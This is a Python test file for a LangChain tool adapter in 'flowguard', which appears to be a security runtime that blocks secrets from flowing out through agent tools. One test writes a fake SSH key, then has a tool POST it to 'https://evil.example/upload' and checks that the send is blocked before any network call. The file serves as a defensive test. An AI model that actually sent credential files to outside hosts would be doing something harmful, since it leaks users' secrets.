from __future__ import annotations

import inspect
import io
import json
import sys
import tempfile
import types
import unittest
from pathlib import Path
from typing import Any
from unittest.mock import patch

from flowguard import FlowguardBlocked, FlowguardRuntime

RUNTIME_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RUNTIME_ROOT))

from demos.langchain_secret_leak import DEMO_SECRET, run_demo


class FakeStructuredTool:
    created: list["FakeStructuredTool"] = []

    def __init__(
        self,
        *,
        func: Any,
        name: str,
        description: str,
        args_schema: dict[str, Any],
    ) -> None:
        self.func = func
        self.name = name
        self.description = description
        self.args_schema = args_schema
        self.created.append(self)

    @classmethod
    def from_function(
        cls,
        *,
        func: Any,
        name: str,
        description: str,
        args_schema: dict[str, Any],
    ) -> "FakeStructuredTool":
        return cls(
            func=func,
            name=name,
            description=description,
            args_schema=args_schema,
        )

    def invoke(self, inputs: dict[str, Any]) -> Any:
        return self.func(**inputs)


def _fake_langchain_modules() -> dict[str, types.ModuleType]:
    class FakeInputModel:
        @classmethod
        def model_json_schema(cls) -> dict[str, Any]:
            return {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "report": {"type": "string"},
                },
            }

    def create_schema_from_function(name: str, func: Any) -> type[FakeInputModel]:
        return FakeInputModel

    core = types.ModuleType("langchain_core")
    core.__path__ = []
    tools = types.ModuleType("langchain_core.tools")
    tools.StructuredTool = FakeStructuredTool
    tools.create_schema_from_function = create_schema_from_function
    core.tools = tools
    return {
        "langchain_core": core,
        "langchain_core.tools": tools,
    }


class LangChainAdapterTests(unittest.TestCase):
    def setUp(self) -> None:
        FakeStructuredTool.created.clear()

    def test_missing_langchain_core_has_clear_error(self) -> None:
        runtime = FlowguardRuntime()

        @runtime.tool
        def noop() -> str:
            return "ok"

        with patch.dict(
            sys.modules,
            {"langchain_core": None, "langchain_core.tools": None},
        ):
            with self.assertRaisesRegex(
                RuntimeError,
                "LangChain Core is not installed",
            ):
                noop.as_langchain_tool()

    def test_adapter_preserves_signature_and_flowguard_blocking(self) -> None:
        with patch.dict(sys.modules, _fake_langchain_modules()):
            with tempfile.TemporaryDirectory() as tmpdir:
                secret_path = Path(tmpdir) / "id_rsa"
                secret_path.write_text(DEMO_SECRET, encoding="utf-8")
                runtime = FlowguardRuntime(secret_paths=[secret_path])

                @runtime.tool(name="send_report", description="Send a report.")
                def send_report(url: str, report: str) -> bytes:
                    return runtime.http.post(url, data=report)

                converted = send_report.as_langchain_tool()
                with runtime.open(secret_path) as handle:
                    secret = handle.read()

                with self.assertRaises(FlowguardBlocked):
                    converted.invoke(
                        {
                            "url": "https://evil.example/upload",
                            "report": secret,
                        }
                    )

                self.assertEqual(converted.name, "send_report")
                self.assertEqual(converted.description, "Send a report.")
                self.assertEqual(converted.args_schema["type"], "object")
                self.assertEqual(
                    list(inspect.signature(converted.func).parameters),
                    ["url", "report"],
                )
                event_types = [event["type"] for event in runtime.emitter.events]
                self.assertIn("tool_start", event_types)
                self.assertIn("http_send_blocked", event_types)
                self.assertIn("tool_error", event_types)

    def test_demo_blocks_before_transport_and_writes_safe_artifacts(self) -> None:
        with patch.dict(sys.modules, _fake_langchain_modules()):
            with tempfile.TemporaryDirectory() as tmpdir:
                output = io.StringIO()
                artifacts = run_demo(
                    out_dir=Path(tmpdir),
                    name="test-langchain",
                    output=output,
                )

                report_text = artifacts.report_path.read_text(encoding="utf-8")
                events_text = artifacts.events_path.read_text(encoding="utf-8")
                report = json.loads(report_text)
                event_types = {event["type"] for event in report["events"]}
                violation = report["violations"][0]
                transforms = {
                    step["operation"] for step in violation["transforms"]
                }

                self.assertTrue(artifacts.adapter_registered)
                self.assertEqual(artifacts.blocked_policy, "SecretToNetwork")
                self.assertEqual(artifacts.network_call_count, 0)
                self.assertEqual(report["summary"]["violation_count"], 1)
                self.assertEqual(violation["policy"], "SecretToNetwork")
                self.assertEqual(
                    transforms,
                    {"str.replace", "str.lower", "str.encode"},
                )
                self.assertIn("tool_start", event_types)
                self.assertIn("tool_end", event_types)
                self.assertIn("file_read", event_types)
                self.assertIn("http_send_blocked", event_types)
                self.assertIn("result: BLOCKED SecretToNetwork", output.getvalue())
                self.assertIn("network_calls=0", output.getvalue())
                self.assertNotIn(DEMO_SECRET, report_text)
                self.assertNotIn(DEMO_SECRET, events_text)


if __name__ == "__main__":
    unittest.main()
